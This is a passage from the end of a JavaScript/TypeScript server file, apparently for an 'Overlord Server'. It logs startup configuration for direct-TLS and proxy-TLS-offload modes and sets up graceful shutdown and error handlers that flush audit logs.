    heartbeatIntervalMs: HEARTBEAT_INTERVAL_MS,
    disconnectTimeoutMs: DISCONNECT_TIMEOUT_MS,
  });

  if (tls) {
    logServerStartup(server, tls.certPathUsed, tls.source);
    logger.info(`[HTTP] maxRequestBodySize=${MAX_HTTP_BODY_BYTES} bytes`);
  } else {
    const hostname = server.hostname || "0.0.0.0";
    const port = server.port ?? 0;
    logger.info("========================================");
    logger.info("Overlord Server - PROXY TLS OFFLOAD MODE");
    logger.info("========================================");
    logger.info(`HTTP (internal): http://${hostname}:${port}`);
    logger.info(`WS   (internal): ws://${hostname}:${port}/api/clients/{id}/stream/ws`);
    logger.info("");
    logger.info("External access should be HTTPS/WSS via your reverse proxy platform.");
    logger.info("Set this mode only when TLS is terminated by the platform (for example Render). ");
    logger.info(`[HTTP] maxRequestBodySize=${MAX_HTTP_BODY_BYTES} bytes`);
    logger.info("========================================");
  }
}

startServer();


function gracefulShutdown() {
  logger.info("\n[server] Shutting down gracefully...");
  void pluginRuntime.shutdownAll();
  flushAuditLogsSync();
  process.exit(0);
}
process.on("SIGINT", gracefulShutdown);
process.on("SIGTERM", gracefulShutdown);

process.on("uncaughtException", (err) => {
  logger.error("[server] uncaught exception:", err);
  flushAuditLogsSync();
  process.exit(1);
});

process.on("unhandledRejection", (reason) => {
  logger.error("[server] unhandled rejection:", reason);
});
